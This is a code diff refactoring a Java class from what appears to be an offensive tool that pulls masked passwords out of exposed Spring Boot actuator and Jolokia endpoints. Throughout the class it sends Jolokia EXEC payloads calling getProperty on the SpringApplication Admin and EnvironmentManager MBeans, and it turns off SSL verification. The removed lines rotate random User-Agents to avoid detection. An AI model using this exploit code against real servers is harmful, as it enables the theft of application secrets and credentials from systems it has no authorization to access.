@@ -1,5 +1,6 @@
 package src.main.module;
 
+import src.main.common.HTTPConfig;
 import src.main.common.UA_Config;
 import src.main.impl.ResultCallback;
 
@@ -8,13 +9,12 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
-import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class GetSpPassWord_I {
     public String address;
@@ -38,15 +38,9 @@ public class GetSpPassWord_I {
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
-        String ua = "";
         disableSSLVerification();
         try {
-            URL obj = new URL(pocsite);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(pocsite);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -64,10 +58,7 @@ public class GetSpPassWord_I {
                     text = String.format("jolokia 依赖为: %s",matcher.group(1));
                     callback.onResult(text);
                 }
-                URL obj1 = new URL(site);
-                HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                ua = uacf.getRandomUserAgent(ualist);
-                conn1.setRequestProperty("User-Agent",ua);
+                HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                 conn1.setRequestMethod("POST");
                 conn1.setRequestProperty("Content-Type", "application/json");
                 conn1.setDoOutput(true);
@@ -114,15 +105,9 @@ public class GetSpPassWord_I {
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
-        String ua = "";
         disableSSLVerification();
         try {
-            URL obj = new URL(pocsite);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(pocsite);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -140,10 +125,7 @@ public class GetSpPassWord_I {
                     text = String.format("jolokia 依赖为: %s",matcher.group(1));
                     callback.onResult(text);
                 }
-                URL obj1 = new URL(site);
-                HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                ua = uacf.getRandomUserAgent(ualist);
-                conn1.setRequestProperty("User-Agent",ua);
+                HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                 conn1.setRequestMethod("POST");
                 conn1.setRequestProperty("Content-Type", "application/json");
                 conn1.setDoOutput(true);
@@ -195,15 +177,11 @@ public class GetSpPassWord_I {
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
-        String ua = "";
         disableSSLVerification();
         try {
-            URL obj = new URL(pocsite);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            HttpURLConnection conn = HTTPConfig.createConnection(pocsite);
             UA_Config uacf = new UA_Config();
             List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -218,11 +196,9 @@ public class GetSpPassWord_I {
                 Matcher matcher = pattern.matcher(response.toString());
                 if(matcher.find()){
                     text = String.format("jolokia 依赖为: %s",matcher.group(1));
-                    callback.onResult(text);                }
-                URL obj1 = new URL(site);
-                HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                ua = uacf.getRandomUserAgent(ualist);
-                conn1.setRequestProperty("User-Agent",ua);
+                    callback.onResult(text);
+                }
+                HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                 conn1.setRequestMethod("POST");
                 conn1.setRequestProperty("Content-Type", "application/json");
                 conn1.setDoOutput(true);
@@ -272,15 +248,9 @@ public class GetSpPassWord_I {
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
-        String ua = "";
         disableSSLVerification();
         try {
-            URL obj = new URL(pocsite);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(pocsite);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -296,10 +266,7 @@ public class GetSpPassWord_I {
                 if(matcher.find()) {
                     text = String.format("jolokia 依赖为: %s", matcher.group(1));
                     callback.onResult(text);
-                    URL obj1 = new URL(site);
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                    ua = uacf.getRandomUserAgent(ualist);
-                    conn1.setRequestProperty("User-Agent",ua);
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                     conn1.setRequestMethod("POST");
                     conn1.setRequestProperty("Content-Type", "application/json");
                     conn1.setDoOutput(true);
@@ -346,15 +313,9 @@ public class GetSpPassWord_I {
         // Result1 3 为 sp1
         // Result2 4 为 sp2
         String site = address + "/actuator/env";
-        String ua = "";
         try {
             disableSSLVerification();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn =HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
